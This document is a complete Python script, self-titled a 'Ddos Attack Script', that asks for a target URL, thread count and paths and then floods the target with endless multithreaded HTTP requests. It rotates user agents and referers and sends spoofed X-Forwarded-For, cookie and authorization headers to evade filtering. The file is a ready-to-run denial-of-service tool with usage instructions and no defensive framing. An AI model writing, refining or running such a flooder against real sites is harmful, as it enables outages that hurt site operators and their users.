import requests
import threading
import time
import random
import string

# Display the title and instructions
print("====================================")
print("         Zinc Ddos Attack Script    ")
print("====================================")
print("Instructions:")
print("1. Enter the target URL (e.g., https://example.com).")
print("2. Enter the number of threads you want to use (e.g., 100).")
print("3. Enter one or more paths (e.g., /login,/api,/home) separated by commas.")
print("   The script will send requests to each path with a random query string.")
print("====================================")


# Function to generate a random string (can use it as a hash)
def generate_random_string(length=8):
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


# Function to send HTTP requests with different paths
def flood(base_url, threads, paths):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    ]

    referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://facebook.com/",
        "https://twitter.com/",
        "https://t.co/",
        "https://reddit.com/",
        "http://192.168.0.1/",
    ]

    languages = ["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "zh-CN,zh;q=0.8", "ru-RU,ru;q=0.8"]

    x_forwarded_for = [
        "8.8.8.8",
        "192.168.1.1",
        f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    ]

    cookies = [
        "sessionid=xyz123;",
        "token=abc.def.ghi;",
        "",
    ]

    auths = [
        "Bearer fake.jwt.token",
        "Basic dXNlcjpwYXNz",  # base64 "user:pass"
        "",
    ]

    accept_headers = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    ]

    def send_request():
        path_index = 0
        while True:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": random.choice(referers),
                "X-Forwarded-For": random.choice(x_forwarded_for),
                "Accept": random.choice(accept_headers),
                "Accept-Language": random.choice(languages),
                "Content-Type": "application/json",
                "Cookie": random.choice(cookies),
                "Authorization": random.choice(auths),
                "Host": "yourdomain.com",
                "Connection": random.choice(["keep-alive", "close"]),
                "DNT": random.choice(["1", "0"]),
                "Sec-Fetch-Site": random.choice(["same-origin", "cross-site", "none"]),
                "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
                "Sec-Fetch-Dest": random.choice(["document", "script", "empty"]),
                "Upgrade-Insecure-Requests": "1",
            }
            path = paths[path_index % len(paths)].strip().lstrip("/")  # clean path
            url = f"{base_url}/{path}"

            try:
                response = requests.get(url, headers=headers)
                print(f"Sent request to {url} with status code {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")

            path_index += 1

    for _ in range(threads):
        t = threading.Thread(target=send_request)
        t.daemon = True
        t.start()


# Main function to handle user input
def main():
    base_url = (
        input("Enter the target URL (e.g., https://example.com): ").strip().rstrip("/")
    )
    threads = int(input("Enter the number of threads (e.g., 100): "))
    paths_input = input("Enter paths separated by commas (e.g., /login,/home,/api): ")
    paths = [p.strip() for p in paths_input.split(",") if p.strip()]

    if not paths:
        print("No valid paths provided. Using root path only ('/').")
        paths = [""]

    print(
        f"\nStarting the flood on {base_url} with {threads} threads using paths: {paths}\n"
    )
    flood(base_url, threads, paths)

    while True:
        time.sleep(1)


if __name__ == "__main__":
    main()
